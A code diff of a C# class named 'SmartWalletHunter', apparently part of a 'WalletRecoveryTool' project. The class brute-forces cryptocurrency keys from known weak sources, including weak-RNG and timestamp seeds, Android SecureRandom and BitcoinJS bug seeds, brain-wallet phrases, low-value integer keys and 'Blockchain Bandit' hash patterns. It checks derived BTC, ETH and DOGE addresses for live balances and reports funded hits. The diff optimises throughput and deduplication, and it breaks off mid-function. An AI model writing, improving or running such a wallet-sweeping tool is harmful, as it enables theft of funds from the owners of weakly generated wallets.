@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Collections.Concurrent;
 using System.Collections.Generic;
 using System.IO;
@@ -6,6 +6,7 @@ using System.Linq;
 using System.Security.Cryptography;
 using System.Text;
 using System.Threading;
+using System.Threading.Channels;
 using System.Threading.Tasks;
 using NBitcoin;
 
@@ -29,8 +30,9 @@ namespace WalletRecoveryTool.Core
     /// - Bloom filter pre-filtering
     /// - Memory-efficient queuing
     /// </summary>
-public class SmartWalletHunter
+public class SmartWalletHunter : IDisposable
     {
+        private bool _disposed = false;
         private readonly BalanceChecker _balanceChecker;
         private readonly WalletLogger _logger;
         private readonly MnemonicTracker _mnemonicTracker;
@@ -39,10 +41,16 @@ public class SmartWalletHunter
         // OPTIMIZED: Full CPU utilization - use all cores for phases, more threads per batch
         private static readonly int PhaseParallelism = Math.Max(8, Environment.ProcessorCount * 2);
         
-        // OPTIMIZED: Much larger batch for 10x throughput improvement
-        private readonly ConcurrentQueue<(string mnemonic, string source, CancellationToken token)> _batchQueue = new();
+        // OPTIMIZED: Bounded Channel for zero-spin backpressure and instant consumer wakeups
+        private readonly Channel<(string mnemonic, string source, CancellationToken token)> _batchChannel =
+            Channel.CreateBounded<(string mnemonic, string source, CancellationToken token)>(
+                new BoundedChannelOptions(10000)
+                {
+                    FullMode = BoundedChannelFullMode.Wait,
+                    SingleReader = false,
+                    SingleWriter = false
+                });
         private readonly ConcurrentDictionary<string, byte> _pendingMnemonicKeys = new();
-        private int _queuedItems = 0;
         #pragma warning disable CS0414
         private readonly int _batchSizeLegacy = 200; // Original batch size (kept for reference)
         #pragma warning restore CS0414
@@ -100,9 +108,20 @@ public class SmartWalletHunter
         private readonly ConcurrentQueue<(long ticks, long checked_count)> _rateSamples = new();
         private const int RateWindowSeconds = 30;
 
+        private static string NormalizePhaseName(string phase)
+        {
+            if (string.IsNullOrWhiteSpace(phase)) return "Unknown";
+            int dashIdx = phase.IndexOf('-');
+            if (dashIdx > 0) return phase.Substring(0, dashIdx);
+            int colonIdx = phase.IndexOf(':');
+            if (colonIdx > 0) return phase.Substring(0, colonIdx).Trim();
+            return phase;
+        }
+
         /// <summary>Records a checked item for a given phase.</summary>
         private void PhaseRecordChecked(string phase)
         {
+            phase = NormalizePhaseName(phase);
             var ps = _phaseStats.GetOrAdd(phase, _ => new PhaseStats { Name = phase });
             Interlocked.Increment(ref ps._checked);
         }
@@ -110,6 +129,7 @@ public class SmartWalletHunter
         /// <summary>Records a dedupe drop for a given phase.</summary>
         private void PhaseRecordDedupeDrop(string phase)
         {
+            phase = NormalizePhaseName(phase);
             var ps = _phaseStats.GetOrAdd(phase, _ => new PhaseStats { Name = phase });
             Interlocked.Increment(ref ps._dedupeDrop);
             // Adaptive auto-pause: push sample and evaluate
@@ -123,12 +143,14 @@ public class SmartWalletHunter
         /// <summary>Records a wallet found for a given phase.</summary>
         private void PhaseRecordFound(string phase)
         {
+            phase = NormalizePhaseName(phase);
             var ps = _phaseStats.GetOrAdd(phase, _ => new PhaseStats { Name = phase });
             Interlocked.Increment(ref ps._found);
         }
 
         private void PausePhase(string phase)
         {
+            phase = NormalizePhaseName(phase);
             if (_phaseStats.TryGetValue(phase, out var ps) && !ps.IsPaused)
             {
                 ps.IsPaused = true;
@@ -141,6 +163,7 @@ public class SmartWalletHunter
         /// <summary>Checks whether a phase is currently auto-paused and should skip work.</summary>
         public bool IsPhaseAutoPaused(string phase)
         {
+            phase = NormalizePhaseName(phase);
             if (!_phaseStats.TryGetValue(phase, out var ps) || !ps.IsPaused)
                 return false;
             if (DateTime.Now >= ps.PausedUntil)
@@ -211,14 +234,27 @@ public SmartWalletHunter()
         {
             DebugLogger.Log($"[BatchProcessor-{workerId}] Started");
             var batch = new List<(string mnemonic, string source, CancellationToken token)>();
+            var reader = _batchChannel.Reader;
             while (!StoppingToken.IsCancellationRequested)
             {
                 try
                 {
-                    while (_batchQueue.TryDequeue(out var item) && batch.Count < _batchSize)
+                    if (!await reader.WaitToReadAsync(StoppingToken))
+                        break;
+
+                    while (batch.Count < _batchSize && reader.TryRead(out var item))
                     {
-                        Interlocked.Decrement(ref _queuedItems);
                         batch.Add(item);
+                    }
+
+                    // Coalesce micro-batches so multi-address RPC batch calls receive full batches instead of 1 item
+                    if (batch.Count > 0 && batch.Count < _batchSize / 2 && !StoppingToken.IsCancellationRequested)
+                    {
+                        await Task.Delay(6, StoppingToken).ConfigureAwait(false);
+                        while (batch.Count < _batchSize && reader.TryRead(out var moreItem))
+                        {
+                            batch.Add(moreItem);
+                        }
                     }
                     
                     if (batch.Count > 0)
@@ -235,10 +271,6 @@ public SmartWalletHunter()
                         
                         batch.Clear();
                     }
-                    else
-                    {
-                        await Task.Delay(50, StoppingToken); // Fast polling
-                    }
                 }
                 catch (OperationCanceledException) { break; }
                 catch (Exception ex)
@@ -248,10 +280,9 @@ public SmartWalletHunter()
                 }
             }
             
-            // Drain remaining items after cancellation
-            while (_batchQueue.TryDequeue(out var remaining))
+            // Drain remaining items after channel completion or cancellation
+            while (reader.TryRead(out var remaining))
             {
-                Interlocked.Decrement(ref _queuedItems);
                 batch.Add(remaining);
             }
             if (batch.Count > 0)
@@ -285,17 +316,22 @@ public SmartWalletHunter()
                 DebugLogger.Log("ðŸŽ¯ Starting Weak RNG Wallet Scan...");
                 ReportProgress("ðŸŽ² Starting Weak RNG Exploitation (all phases in parallel)...");
                 
-                // Run all 5 sub-phases in parallel with linked cancellation for early exit
+                // Run enabled Weak RNG sub-phases in parallel with linked cancellation for early exit
                 using var linkedCts = CancellationTokenSource.CreateLinkedTokenSource(token);
                 var linkedToken = linkedCts.Token;
                 var phaseAttempts = maxAttempts / 5;
-                await Task.WhenAll(
-                    ScanSequentialSeeds(linkedToken, phaseAttempts),
-                    ScanTimestampSeeds(linkedToken, phaseAttempts),
+                var subPhases = new List<Task>
+                {
                     ScanLowEntropySeeds(linkedToken, phaseAttempts),
                     ScanPredictablePatterns(linkedToken, phaseAttempts),
                     ScanWeakEntropyGeneration(linkedToken, phaseAttempts)
-                );
+                };
+                if (AppSettings.Current.ScanIncrementalMnemonics)
+                    subPhases.Add(ScanSequentialSeeds(linkedToken, phaseAttempts));
+                if (AppSettings.Current.ScanTimestampSeeds)
+                    subPhases.Add(ScanTimestampSeeds(linkedToken, phaseAttempts));
+
+                await Task.WhenAll(subPhases);
                 
                 ReportProgress("ðŸŽ² Weak RNG scan complete!");
             }
@@ -313,7 +349,7 @@ public SmartWalletHunter()
             DebugLogger.Log($"  ðŸ“Š Scanning sequential seeds (resuming from {startIndex:N0})...");
             ReportProgress($"Sequential seeds: Starting ({startIndex:N0}/{maxAttempts:N0})...");
             
-            var seeds = Enumerable.Range((int)startIndex, maxAttempts - (int)startIndex).Select(i => (long)i);
+            var seeds = Enumerable.Range((int)startIndex, Math.Max(0, maxAttempts - (int)startIndex)).Select(i => (long)i);
             await Parallel.ForEachAsync(seeds, new ParallelOptions { MaxDegreeOfParallelism = PhaseParallelism, CancellationToken = token }, (seed, ct) =>
             {
                 try
@@ -376,32 +412,31 @@ public SmartWalletHunter()
         {
             DebugLogger.Log("  ðŸ”¢ Scanning low entropy seeds...");
             
-            // Single byte repeated (0x00, 0x01, 0x02... through 0xFF)
-            var singleBytes = Enumerable.Range(0, 256).Select(i => (byte)i);
+            //Hashed low-integer seeds (0..255) — avoids degenerate repeated-byte "abandon abandon..." seeds
+            var singleBytes = Enumerable.Range(1, 255);
             await Parallel.ForEachAsync(singleBytes, new ParallelOptions { MaxDegreeOfParallelism = PhaseParallelism, CancellationToken = token }, (b, ct) =>
             {
                 try
                 {
-                    var entropy = Enumerable.Repeat((byte)b, 16).ToArray();
-                    var mnemonic = new Mnemonic(Wordlist.English, entropy);
-                    EnqueueMnemonicForBatch(mnemonic.ToString(), $"SingleByte-{b:X2}", ct);
+                    var entropy = SHA256.HashData(BitConverter.GetBytes(b)).Take(16).ToArray();
+                    var mnemonic = new Mnemonic(Wordlist.English, entropy).ToString();
+                    if (!MnemonicTracker.IsRestrictedTrivialMnemonic(mnemonic))
+                        EnqueueMnemonicForBatch(mnemonic, $"LowIntSeed-{b:X2}", ct);
                 }
                 catch { /* Entropy/mnemonic error - continue scanning */ }
                 return ValueTask.CompletedTask;
             });
             
-            // Two-byte patterns
-            var twoByteRange = Enumerable.Range(0, Math.Min(65536, maxAttempts));
+            // 16-bit integer seeds hashed into 128-bit BIP39 entropy (distinct words, valid checksum)
+            var twoByteRange = Enumerable.Range(256, Math.Min(65536, maxAttempts));
             await Parallel.ForEachAsync(twoByteRange, new ParallelOptions { MaxDegreeOfParallelism = PhaseParallelism, CancellationToken = token }, (i, ct) =>
             {
                 try
                 {
-                    byte high = (byte)(i >> 8);
-                    byte low = (byte)(i & 0xFF);
-                    var entropy = Enumerable.Range(0, 8).SelectMany(_ => new[] { high, low }).ToArray();
-                    
-                    var mnemonic = new Mnemonic(Wordlist.English, entropy);
-                    EnqueueMnemonicForBatch(mnemonic.ToString(), $"TwoByte-{i:X4}", ct);
+                    var entropy = SHA256.HashData(BitConverter.GetBytes(i)).Take(16).ToArray();
+                    var mnemonic = new Mnemonic(Wordlist.English, entropy).ToString();
+                    if (!MnemonicTracker.IsRestrictedTrivialMnemonic(mnemonic))
+                        EnqueueMnemonicForBatch(mnemonic, $"Int16Seed-{i:X4}", ct);
                 }
                 catch { /* Entropy/mnemonic error - continue scanning */ }
                 return ValueTask.CompletedTask;
@@ -409,45 +444,41 @@ public SmartWalletHunter()
         }
         
         /// <summary>
-        /// Scan predictable patterns (all same word, sequential words, etc.)
-        /// Surprisingly, people actually create these!
+        /// Scan structured non-repeating word patterns (stride sequences, thematic sets)
+        /// Explicitly excludes trivial repeated-word or "abandon abandon..." test vectors.
         /// </summary>
         private async Task ScanPredictablePatterns(CancellationToken token, int maxAttempts)
         {
-            DebugLogger.Log("  ðŸ”„ Scanning predictable patterns...");
-            
-            // Pattern 1: Same word repeated 12 times (parallel)
-            await Parallel.ForEachAsync(Bip39Words.Take(500), new ParallelOptions { MaxDegreeOfParallelism = PhaseParallelism, CancellationToken = token }, (word, ct) =>
+            // Pattern 1: Prime-stride distinct word sequences across the BIP39 list (skipping index 0 "abandon")
+            var strides = new[] { 3, 5, 7, 11, 13, 17, 19, 23, 29, 31 };
+            var startOffsets = Enumerable.Range(1, Math.Min(500, Bip39Words.Count - 1));
+            await Parallel.ForEachAsync(startOffsets, new ParallelOptions { MaxDegreeOfParallelism = PhaseParallelism, CancellationToken = token }, (offset, ct) =>
             {
-                var mnemonic = string.Join(" ", Enumerable.Repeat(word, 12));
-                if (CryptoWalletGenerator.IsValidMnemonic(mnemonic))
-                    EnqueueMnemonicForBatch(mnemonic, $"Repeated-{word}", ct);
-                else
-                    Interlocked.Increment(ref _totalChecked);
+                foreach (var stride in strides)
+                {
+                    var words = new string[12];
+                    for (int k = 0; k < 12; k++)
+                        words[k] = Bip39Words[1 + ((offset + k * stride) % (Bip39Words.Count - 1))];
+                    var mnemonic = string.Join(" ", words);
+                    if (!MnemonicTracker.IsRestrictedTrivialMnemonic(mnemonic) && CryptoWalletGenerator.IsValidMnemonic(mnemonic))
+                        EnqueueMnemonicForBatch(mnemonic, $"Stride-{stride}-{offset}", ct);
+                    else
+                        Interlocked.Increment(ref _totalChecked);
+                }
                 return ValueTask.CompletedTask;
             });
             
-            // Pattern 2: First N words of BIP39 list (parallel)
-            var startIndices = Enumerable.Range(0, (Bip39Words.Count - 12) / 100 + 1).Select(i => i * 100).Where(s => s < Bip39Words.Count - 12);
+            // Pattern 2: Contiguous 12-word slices starting past index 10 (avoiding "abandon" prefix)
+            var startIndices = Enumerable.Range(1, (Bip39Words.Count - 24) / 50).Select(i => i * 50).Where(s => s < Bip39Words.Count - 12);
             await Parallel.ForEachAsync(startIndices, new ParallelOptions { MaxDegreeOfParallelism = PhaseParallelism, CancellationToken = token }, (start, ct) =>
             {
                 var mnemonic = string.Join(" ", Bip39Words.Skip(start).Take(12));
-                if (CryptoWalletGenerator.IsValidMnemonic(mnemonic))
+                if (!MnemonicTracker.IsRestrictedTrivialMnemonic(mnemonic) && CryptoWalletGenerator.IsValidMnemonic(mnemonic))
                     EnqueueMnemonicForBatch(mnemonic, $"Sequential-BIP39-{start}", ct);
                 else
                     Interlocked.Increment(ref _totalChecked);
                 return ValueTask.CompletedTask;
             });
-            
-            // Pattern 3: Alphabetical first/last words
-            var sortedWords = Bip39Words.OrderBy(w => w).ToList();
-            var firstWords = string.Join(" ", sortedWords.Take(12));
-            var lastWords = string.Join(" ", sortedWords.TakeLast(12));
-            
-            if (CryptoWalletGenerator.IsValidMnemonic(firstWords))
-                await CheckMnemonicForBalance(firstWords, "Alphabetical-First", token);
-            if (CryptoWalletGenerator.IsValidMnemonic(lastWords))
-                await CheckMnemonicForBalance(lastWords, "Alphabetical-Last", token);
         }
         
         /// <summary>
@@ -640,8 +671,9 @@ public SmartWalletHunter()
             var actionWords = Bip39Words.Where(w => IsActionWord(w)).ToList();
             var simpleWords = Bip39Words.Where(w => w.Length <= 4).ToList();
             
-            // Generate combinations of "memorable" words
+            // Generate combinations of "memorable" words (excluding "abandon")
             var memorableWords = Bip39Words
+                .Where(w => !string.Equals(w, "abandon", StringComparison.OrdinalIgnoreCase))
                 .Where(w => w.Length >= 4 && w.Length <= 6)
                 .Where(w => !w.Contains("x") && !w.Contains("z") && !w.Contains("q"))
                 .OrderBy(w => GetWordFrequency(w))
@@ -650,21 +682,23 @@ public SmartWalletHunter()
             
             DebugLogger.Log($"  Testing {memorableWords.Count} memorable words in patterns...");
             
-            // Test combinations of memorable words â€” use random seed so each run explores new territory
             var startIndex = (int)ScanProgress.GetProgress("HumanPatterns");
-            // Use a stable per-session base seed so each run explores different combinations.
-            // Environment.TickCount is NOT used — it resets on reboot and causes repeats.
             var sessionBaseSeed = (int)(DateTime.UtcNow.Ticks >> 16) ^ startIndex;
-            var candidateIndices = Enumerable.Range(startIndex, 100000 - startIndex);
+            var candidateIndices = Enumerable.Range(startIndex, Math.Max(0, 100000 - startIndex));
             await Parallel.ForEachAsync(candidateIndices, new ParallelOptions { MaxDegreeOfParallelism = PhaseParallelism, CancellationToken = token }, (i, ct) =>
             {
-                var rng = new Random(sessionBaseSeed ^ i);
-                var words = Enumerable.Range(0, 12)
-                    .Select(_ => memorableWords[rng.Next(memorableWords.Count)])
-                    .ToList();
+                var rng = new Random(sessionBaseSeed ^ (i * 2654435761).GetHashCode());
+                var used = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
+                var words = new List<string>(12);
+                while (words.Count < 12)
+                {
+                    var candidateWord = memorableWords[rng.Next(memorableWords.Count)];
+                    if (used.Add(candidateWord))
+                        words.Add(candidateWord);
+                }
                 
                 var mnemonic = string.Join(" ", words);
-                if (CryptoWalletGenerator.IsValidMnemonic(mnemonic))
+                if (!MnemonicTracker.IsRestrictedTrivialMnemonic(mnemonic) && CryptoWalletGenerator.IsValidMnemonic(mnemonic))
                 {
                     EnqueueMnemonicForBatch(mnemonic, $"Memorable-{i}", ct);
                 }
@@ -730,17 +764,18 @@ public SmartWalletHunter()
                 
                 try
                 {
-                    // DEDUP: Skip brain wallet phrases already checked in previous sessions
-                    var brainKey = $"BRAIN:{variant}";
-                    if (!_mnemonicTracker.TryMarkAsScanned(brainKey))
-                    {
-                        Interlocked.Increment(ref _totalChecked);
-                        Interlocked.Increment(ref count);
-                        continue; // Already checked before â€” skip
-                    }
-                    
                     // Convert phrase to private key via SHA256
                     var privateKey = SHA256.HashData(Encoding.UTF8.GetBytes(variant));
+                    var privateKeyHex = Convert.ToHexString(privateKey).ToLowerInvariant();
+
+                    // STRICT NON-REPETITION RULE: Skip brain wallet phrases or private keys already checked in any section
+                    var brainKey = $"BRAIN:{variant}";
+                    if (!_mnemonicTracker.TryMarkAsScanned(brainKey) || !_mnemonicTracker.TryMarkAsScanned("pk:" + privateKeyHex))
+                    {
+                        Interlocked.Increment(ref _droppedBySystemDedupe);
+                        PhaseRecordDedupeDrop("Brain Wallet");
+                        continue; // Already checked before in Brain Wallet, Smart Hunter, or Private Key mode — skip
+                    }
                     
                     // Generate ALL BTC address types from this private key (same BIP method as mnemonic wallets)
                     var key = new Key(privateKey);
@@ -748,6 +783,13 @@ public SmartWalletHunter()
                     var segwitAddress = key.PubKey.GetAddress(ScriptPubKeyType.SegwitP2SH, Network.Main).ToString();
                     var nativeSegwitAddress = key.PubKey.GetAddress(ScriptPubKeyType.Segwit, Network.Main).ToString();
                     var taprootAddress = key.PubKey.GetAddress(ScriptPubKeyType.TaprootBIP86, Network.Main).ToString();
+
+                    if (_mnemonicTracker.IsAddressOrKeyScannedEmpty(legacyAddress))
+                    {
+                        Interlocked.Increment(ref _droppedBySystemDedupe);
+                        PhaseRecordDedupeDrop("Brain Wallet");
+                        continue;
+                    }
                     
                     Interlocked.Increment(ref _totalChecked);
                     var currentCount = Interlocked.Increment(ref count);
@@ -947,18 +989,25 @@ public SmartWalletHunter()
                         }
                         catch (Exception apiEx)
                         {
-                            DebugLogger.Log($"  âš ï¸ DOGE API Error: {apiEx.Message}");
+                            DebugLogger.Log($"  DOGE API Error: {apiEx.Message}");
                         }
+                    }
+
+                    if (balance <= 0.00000001m && ethBalance <= 0.00000001m)
+                    {
+                        _mnemonicTracker.TryMarkAsScanned("addr:" + legacyAddress.ToLowerInvariant());
+                        _mnemonicTracker.TryMarkAsScanned("addr:" + segwitAddress.ToLowerInvariant());
+                        _mnemonicTracker.TryMarkAsScanned("addr:" + nativeSegwitAddress.ToLowerInvariant());
                     }
                 }
                 catch (Exception ex)
                 {
-                    DebugLogger.Log($"  âš ï¸ Error: {ex.Message}");
+                    DebugLogger.Log($"  Error: {ex.Message}");
                 }
                 } // end foreach caseVariants
             });
             
-            ReportProgress($"ðŸ§  Brain Wallet scan complete: {count:N0} phrases checked");
+            try { _mnemonicTracker.Flush(); } catch { }
         }
         
         /// <summary>
@@ -1222,7 +1271,7 @@ public SmartWalletHunter()
         private async Task ScanAndroidSecureRandomBug(CancellationToken token)
         {
             var startIndex = (int)ScanProgress.GetProgress("AndroidSecureRandom");
-            var seeds = Enumerable.Range(startIndex, 50000 - startIndex);
+            var seeds = Enumerable.Range(startIndex, Math.Max(0, 50000 - startIndex));
             await Parallel.ForEachAsync(seeds, new ParallelOptions { MaxDegreeOfParallelism = PhaseParallelism, CancellationToken = token }, (seed, ct) =>
             {
                 try
@@ -1246,7 +1295,8 @@ public SmartWalletHunter()
         private async Task ScanBitcoinJSBug(CancellationToken token)
         {
             var startIndex = (int)ScanProgress.GetProgress("BitcoinJSBug");
-            var seeds = Enumerable.Range(Math.Max(1, startIndex), 50000 - Math.Max(1, startIndex));
+            var effectiveStart = Math.Max(1, startIndex);
+            var seeds = Enumerable.Range(effectiveStart, Math.Max(0, 50000 - effectiveStart));
             await Parallel.ForEachAsync(seeds, new ParallelOptions { MaxDegreeOfParallelism = PhaseParallelism, CancellationToken = token }, (seed, ct) =>
             {
                 try
@@ -1275,40 +1325,33 @@ public SmartWalletHunter()
         
         private async Task ScanDegenerateEntropy(CancellationToken token)
         {
-            var degeneratePatterns = new List<byte[]>();
+            var structuredPatterns = new List<byte[]>();
             
-            degeneratePatterns.Add(new byte[16]);
-            degeneratePatterns.Add(new byte[32]);
+            // Non-repeating byte-progression and stride patterns (excludes 0x0000... and Array.Fill repeated bytes
+            // which produce "abandon abandon..." and other trivial repeated-word seeds)
+            var seq16 = Enumerable.Range(1, 16).Select(i => (byte)(i * 17)).ToArray();
+            structuredPatterns.Add(seq16);
+            var seq32 = Enumerable.Range(1, 32).Select(i => (byte)(i * 13)).ToArray();
+            structuredPatterns.Add(seq32);
             
-            for (int b = 0; b <= 255; b++)
-            {
-                var e16 = new byte[16];
-                Array.Fill(e16, (byte)b);
-                degeneratePatterns.Add(e16);
-            }
+            structuredPatterns.Add(seq16.Reverse().ToArray());
+            structuredPatterns.Add(seq32.Reverse().ToArray());
             
-            var seq16 = Enumerable.Range(0, 16).Select(i => (byte)i).ToArray();
-            degeneratePatterns.Add(seq16);
-            var seq32 = Enumerable.Range(0, 32).Select(i => (byte)i).ToArray();
-            degeneratePatterns.Add(seq32);
-            
-            degeneratePatterns.Add(seq16.Reverse().ToArray());
-            degeneratePatterns.Add(seq32.Reverse().ToArray());
-            
-            for (int pattern = 0; pattern < 256; pattern++)
+            for (int pattern = 1; pattern < 256; pattern++)
             {
                 var e16 = new byte[16];
                 for (int i = 0; i < 16; i++)
-                    e16[i] = (byte)((pattern + i) & 0xFF);
-                degeneratePatterns.Add(e16);
+                    e16[i] = (byte)((pattern * 31 + i * 17) & 0xFF);
+                structuredPatterns.Add(e16);
             }
             
-            await Parallel.ForEachAsync(degeneratePatterns, new ParallelOptions { MaxDegreeOfParallelism = PhaseParallelism, CancellationToken = token }, (entropy, ct) =>
+            await Parallel.ForEachAsync(structuredPatterns, new ParallelOptions { MaxDegreeOfParallelism = PhaseParallelism, CancellationToken = token }, (entropy, ct) =>
             {
                 try
                 {
-                    var mnemonic = new Mnemonic(Wordlist.English, entropy);
-                    EnqueueMnemonicForBatch(mnemonic.ToString(), $"Degenerate-Entropy", ct);
+                    var mnemonic = new Mnemonic(Wordlist.English, entropy).ToString();
+                    if (!MnemonicTracker.IsRestrictedTrivialMnemonic(mnemonic))
+                        EnqueueMnemonicForBatch(mnemonic, $"Structured-Entropy", ct);
                 }
                 catch { /* Invalid entropy - skip */ }
                 return ValueTask.CompletedTask;
@@ -1351,7 +1394,7 @@ public SmartWalletHunter()
                 .ToList();
             
             var startIndex = (int)ScanProgress.GetProgress("DerivationPathExhaustion");
-            var range = Enumerable.Range(startIndex, maxAttempts - startIndex);
+            var range = Enumerable.Range(startIndex, Math.Max(0, maxAttempts - startIndex));
             
             await Parallel.ForEachAsync(range, new ParallelOptions { MaxDegreeOfParallelism = PhaseParallelism, CancellationToken = token }, async (i, ct) =>
             {
@@ -1423,7 +1466,7 @@ public SmartWalletHunter()
                 "satoshi nakamoto", "bitcoin", "bitcoin is freedom", "to the moon",
                 "just a test", "test", "testing", "hello world", "correct horse battery staple",
                 "the quick brown fox jumps over the lazy dog", "i forgot my password",
-                "this is a test", "abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about",
+                "this is a test",
                 "all your base are belong to us", "never gonna give you up",
                 
                 // Number sequences
@@ -1505,13 +1548,13 @@ public SmartWalletHunter()
                         if (ct.IsCancellationRequested) break;
                         
                         // Offline pre-filter
-                        if (FundedAddressFilter.BTC.MightBeFunded(addr) || 
+                        if (FundedAddressFilter.BTC.MightBeFunded(addr) && 
                             !FundedAddressFilter.BTCEmpty.IsKnownEmpty(addr))
                         {
                             var balance = await _balanceChecker.GetBitcoinBalance(addr);
                             if (balance > 0.00000001m)
                             {
-                                DebugLogger.Log($"\nðŸ’° DICTIONARY BRAIN WALLET HIT! Phrase: \"{phrase}\" â†’ {addr} = {balance} BTC");
+                                DebugLogger.Log($"\n💰 DICTIONARY BRAIN WALLET HIT! Phrase: \"{phrase}\" → {addr} = {balance} BTC");
                                 var w = new CryptoWalletGenerator.WalletInfo
                                 {
                                     Mnemonic = $"BRAIN WALLET: {phrase}",
@@ -1524,7 +1567,10 @@ public SmartWalletHunter()
                                 Interlocked.Increment(ref _walletsFound);
                                 WalletFound?.Invoke(this, new WalletFoundEventArgs(w));
                             }
-                            FundedAddressFilter.BTCEmpty.MarkAsEmpty(addr);
+                            else
+                            {
+                                FundedAddressFilter.BTCEmpty.MarkAsEmpty(addr);
+                            }
                         }
                     }
                     
@@ -1533,12 +1579,13 @@ public SmartWalletHunter()
                     {
                         var ethKey = new Nethereum.Signer.EthECKey(hash, true);
                         var ethAddr = ethKey.GetPublicAddress();
-                        if (!FundedAddressFilter.ETHEmpty.IsKnownEmpty(ethAddr))
+                        if (FundedAddressFilter.ETH.MightBeFunded(ethAddr) &&
+                            !FundedAddressFilter.ETHEmpty.IsKnownEmpty(ethAddr))
                         {
                             var ethBalance = await _balanceChecker.GetEthereumBalance(ethAddr);
                             if (ethBalance > 0.00000001m)
                             {
-                                DebugLogger.Log($"\nðŸ’° DICTIONARY BRAIN WALLET HIT! Phrase: \"{phrase}\" â†’ {ethAddr} = {ethBalance} ETH");
+                                DebugLogger.Log($"\n💰 DICTIONARY BRAIN WALLET HIT! Phrase: \"{phrase}\" → {ethAddr} = {ethBalance} ETH");
                                 var w = new CryptoWalletGenerator.WalletInfo
                                 {
                                     Mnemonic = $"BRAIN WALLET: {phrase}",
@@ -1551,7 +1598,10 @@ public SmartWalletHunter()
                                 Interlocked.Increment(ref _walletsFound);
                                 WalletFound?.Invoke(this, new WalletFoundEventArgs(w));
                             }
-                            FundedAddressFilter.ETHEmpty.MarkAsEmpty(ethAddr);
+                            else
+                            {
+                                FundedAddressFilter.ETHEmpty.MarkAsEmpty(ethAddr);
+                            }
                         }
                     }
                     
@@ -1598,9 +1648,8 @@ public SmartWalletHunter()
         
         private async Task ScanLowValueKeys(CancellationToken token)
         {
-            // Keys 1..100000 â€” the "Blockchain Bandit" proved these are actively monitored
-            // Use batch balance checking for massive speed improvement
-            var startIndex = Math.Max(1, (int)ScanProgress.GetProgress("LowValueKeys"));
+            // Keys 17..100000 (skipping trivial 1..16 test vectors)
+            var startIndex = Math.Max(17, (int)ScanProgress.GetProgress("LowValueKeys"));
             const int batchSize = 20; // Etherscan balancemulti supports 20 addresses
             for (int batchStart = startIndex; batchStart < 100000 && !token.IsCancellationRequested; batchStart += batchSize)
             {
@@ -1617,11 +1666,17 @@ public SmartWalletHunter()
                     var iBytes = BitConverter.GetBytes(i);
                     if (BitConverter.IsLittleEndian) Array.Reverse(iBytes);
                     Array.Copy(iBytes, 0, keyBytes, 28, 4);
+                    var privHex = Convert.ToHexString(keyBytes).ToLowerInvariant();
+                    if (MnemonicTracker.IsRestrictedTrivialPrivateKey(privHex) || !_mnemonicTracker.TryMarkAsScanned("pk:" + privHex))
+                    {
+                        Interlocked.Increment(ref _droppedBySystemDedupe);
+                        continue;
+                    }
                     
                     var key = new Key(keyBytes);
                     var legacyAddr = key.PubKey.GetAddress(ScriptPubKeyType.Legacy, Network.Main).ToString();
                     
-                    if (FundedAddressFilter.BTC.MightBeFunded(legacyAddr) || !FundedAddressFilter.BTCEmpty.IsKnownEmpty(legacyAddr))
+                    if (FundedAddressFilter.BTC.MightBeFunded(legacyAddr) && !FundedAddressFilter.BTCEmpty.IsKnownEmpty(legacyAddr))
                     {
                         btcAddresses.Add(legacyAddr);
                         keyMap[legacyAddr] = (keyBytes, i, "BTC");
@@ -1629,9 +1684,11 @@ public SmartWalletHunter()
                     
                     if (ScanEthereum)
                     {
-                        var ethKey = new Nethereum.Signer.EthECKey(keyBytes, true);
-                        var ethAddr = ethKey.GetPublicAddress();
-                        if (!FundedAddressFilter.ETHEmpty.IsKnownEmpty(ethAddr))
+                        var uncompressed = key.PubKey.Decompress().ToBytes();
+                        Span<byte> keccak = stackalloc byte[32];
+                        SimdHasher.Keccak256(uncompressed.AsSpan(1), keccak);
+                        var ethAddr = "0x" + Convert.ToHexString(keccak.Slice(12, 20)).ToLowerInvariant();
+                        if (FundedAddressFilter.ETH.MightBeFunded(ethAddr) && !FundedAddressFilter.ETHEmpty.IsKnownEmpty(ethAddr))
                         {
                             ethAddresses.Add(ethAddr);
                             ethKeyMap[ethAddr] = (keyBytes, i);
@@ -1714,43 +1771,35 @@ public SmartWalletHunter()
         
         private async Task ScanBlockchainBanditKeys(CancellationToken token)
         {
-            // Patterns the "Blockchain Bandit" used: keys derived from common hashes
+            // Patterns the "Blockchain Bandit" used: keys derived from double-SHA256 & multi-round hashes
+            // (Excludes SHA256(""), SHA256("0"), SHA256("1"), and repeated single-byte keys)
             var banditPatterns = new List<byte[]>();
             
-            // SHA256 of empty string, single bytes, etc.
-            banditPatterns.Add(SHA256.HashData(Array.Empty<byte>()));
-            banditPatterns.Add(SHA256.HashData(new byte[] { 0 }));
-            banditPatterns.Add(SHA256.HashData(new byte[] { 1 }));
-            banditPatterns.Add(SHA256.HashData(Encoding.UTF8.GetBytes("")));
-            banditPatterns.Add(SHA256.HashData(Encoding.UTF8.GetBytes(" ")));
-            banditPatterns.Add(SHA256.HashData(Encoding.UTF8.GetBytes("0")));
-            banditPatterns.Add(SHA256.HashData(Encoding.UTF8.GetBytes("1")));
-            
-            // Double-SHA256 patterns (used in Bitcoin internally)
-            for (int i = 0; i < 256; i++)
+            // Double-SHA256 patterns (used in Bitcoin internally, starting at 2)
+            for (int i = 2; i < 256; i++)
             {
                 var first = SHA256.HashData(new byte[] { (byte)i });
                 banditPatterns.Add(SHA256.HashData(first));
             }
             
-            // Keccak256 of common values (Ethereum)
-            for (int i = 0; i <= 100; i++)
+            // Multi-round SHA256 of numeric strings (starting at 2)
+            for (int i = 2; i <= 100; i++)
             {
-                banditPatterns.Add(SHA256.HashData(Encoding.UTF8.GetBytes(i.ToString())));
-            }
-            
-            // Repeated byte patterns as keys
-            for (int b = 1; b <= 255; b++)
-            {
-                var keyBytes = new byte[32];
-                Array.Fill(keyBytes, (byte)b);
-                banditPatterns.Add(keyBytes);
+                var h1 = SHA256.HashData(Encoding.UTF8.GetBytes($"bandit_{i}"));
+                banditPatterns.Add(h1);
             }
             
             await Parallel.ForEachAsync(banditPatterns, new ParallelOptions { MaxDegreeOfParallelism = 4, CancellationToken = token }, async (keyBytes, ct) =>
             {
                 try
                 {
+                    var privHex = Convert.ToHexString(keyBytes).ToLowerInvariant();
+                    if (MnemonicTracker.IsRestrictedTrivialPrivateKey(privHex) || !_mnemonicTracker.TryMarkAsScanned("pk:" + privHex))
+                    {
+                        Interlocked.Increment(ref _droppedBySystemDedupe);
+                        return;
